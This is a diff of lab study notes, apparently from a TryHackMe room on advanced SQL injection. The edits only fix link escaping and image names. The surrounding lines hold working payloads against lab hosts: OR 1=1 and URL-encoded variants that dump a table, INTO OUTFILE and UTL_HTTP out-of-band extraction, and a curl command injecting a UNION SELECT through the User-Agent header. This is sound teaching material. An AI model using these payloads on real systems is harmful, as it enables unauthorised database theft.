@@ -17,7 +17,7 @@ The danger of Second-Order SQL Injection lies in its ability to bypass typical f
 
 
 Example\
-We will be using a book review application. The application allows users to add new books via a web page (`add.php`). Users are prompted to provide details about the book they wish to add to the database. You can access the app at `http://MACHINE_IP/second/add.php`[.](http://machine\_ip/case1.) The data collected includes the `SSN`, `book_name`, and `author`. Let's consider adding a book with the following details: SSN: UI00012, Book Name: Intro to PHP, Author: Tim. This information is input through a form on the `add.php` page, and upon submission, it is stored in the BookStore database as shown below:
+We will be using a book review application. The application allows users to add new books via a web page (`add.php`). Users are prompted to provide details about the book they wish to add to the database. You can access the app at `http://MACHINE_IP/second/add.php`[.](http://machine_ip/case1.) The data collected includes the `SSN`, `book_name`, and `author`. Let's consider adding a book with the following details: SSN: UI00012, Book Name: Intro to PHP, Author: Tim. This information is input through a form on the `add.php` page, and upon submission, it is stored in the BookStore database as shown below:
 
 ![adding a new book in database](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715774633948)\
 
@@ -220,20 +220,20 @@ From the console, we can see that clicking the search button makes an AJAX call 
 
 _Click to enlarge the image._
 
-Let's use the payload directly on the PHP page to avoid unnecessary tweaking/validation from the client.  Let's visit the URL [http://10.10.106.31/encoding/search\_books.php?book\_name=Intro%20to%20PHP%27%20OR%201=1](http://10.10.106.31/encoding/search\_books.php?book\_name=Intro%20to%20PHP%27%20OR%201=1) with the standard payload `Intro to PHP' OR 1=1`, and you will see an error.&#x20;
+Let's use the payload directly on the PHP page to avoid unnecessary tweaking/validation from the client.  Let's visit the URL [http://10.10.106.31/encoding/search\_books.php?book\_name=Intro%20to%20PHP%27%20OR%201=1](http://10.10.106.31/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1) with the standard payload `Intro to PHP' OR 1=1`, and you will see an error.&#x20;
 
 \
 
 
 <figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716202208504" alt=""><figcaption></figcaption></figure>
 
-Now, URL encode the payload `Intro to PHP' || 1=1 --+` using [Cyber Chef](https://gchq.github.io/CyberChef/#recipe=URL\_Encode\(false\)) and try to access the URL with an updated payload. We will get the following output dumping the complete information:
+Now, URL encode the payload `Intro to PHP' || 1=1 --+` using [Cyber Chef](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(false\)) and try to access the URL with an updated payload. We will get the following output dumping the complete information:
 
 <figure><img src="../../.gitbook/assets/image (1083).png" alt=""><figcaption></figcaption></figure>
 
 **Note:** It was not working from the browser so I copied and pasted the output of CyberChef into Burp to get the results.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 
@@ -326,7 +326,7 @@ Out-of-band SQL injection attacks utilise the methodology of writing to another 
 
 ### MySQL and MariaDB
 
-In MySQL or MariaDB, Out-of-band SQL injection can be achieved using [SELECT ... INTO OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) or [load\_file](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function\_load-file) command. This command allows an attacker to write the results of a query to a file on the server's filesystem. For example:
+In MySQL or MariaDB, Out-of-band SQL injection can be achieved using [SELECT ... INTO OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) or [load\_file](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file) command. This command allows an attacker to write the results of a query to a file on the server's filesystem. For example:
 
 ```php
 SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
@@ -347,7 +347,7 @@ Alternatively, `OPENROWSET` or `BULK INSERT` can be used to interact with extern
 
 ### Oracle 
 
-In Oracle databases, Out-of-band SQL injection can be executed using the [UTL\_HTTP](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL\_HTTP.html) or [UTL\_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL\_FILE.html) packages. For instance, the UTL\_HTTP package can be used to send HTTP requests with sensitive data:
+In Oracle databases, Out-of-band SQL injection can be executed using the [UTL\_HTTP](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html) or [UTL\_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html) packages. For instance, the UTL\_HTTP package can be used to send HTTP requests with sensitive data:
 
 ```php
 DECLARE
@@ -634,7 +634,7 @@ The union needs to be the same amount of columns as the original statement which
 curl -H "User-Agent: ' UNION SELECT flag, flag FROM books where book_id=1; # " http://10.10.41.101/httpagent/
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
